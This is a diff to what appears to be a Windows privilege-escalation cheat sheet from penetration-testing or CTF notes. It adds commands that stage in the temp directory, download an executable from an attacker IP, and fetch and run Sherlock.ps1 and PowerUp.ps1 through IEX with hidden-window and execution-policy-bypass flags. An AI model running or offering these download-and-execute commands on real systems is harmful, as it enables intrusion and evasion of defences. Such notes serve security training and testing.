@@ -17,12 +17,20 @@ Basic Strategy
 * look for internal ports
 * Check users
 
-### System
+### Basic stuff to do first
 
 ```powershell
 
-sysminfo
+# get into temp dir which is typically writable
+cd $env:temp
 
+systeminfo
+
+# see also hidden files
+Get-ChildItem . -Force
+
+# download stuff if needed
+iwr -uri http://IP -outfile some.exe
 
 ```
 
@@ -260,9 +268,9 @@ REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
 
 ```powershell
 # For older Systems use Sherlock
-powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/Sherlock.ps1');Find-AllVulns"
+powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object System.Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/Sherlock.ps1');Find-AllVulns"
 
-powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1'); Invoke-AllChecks"
+powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1'); Invoke-AllChecks"
 
 ```
 
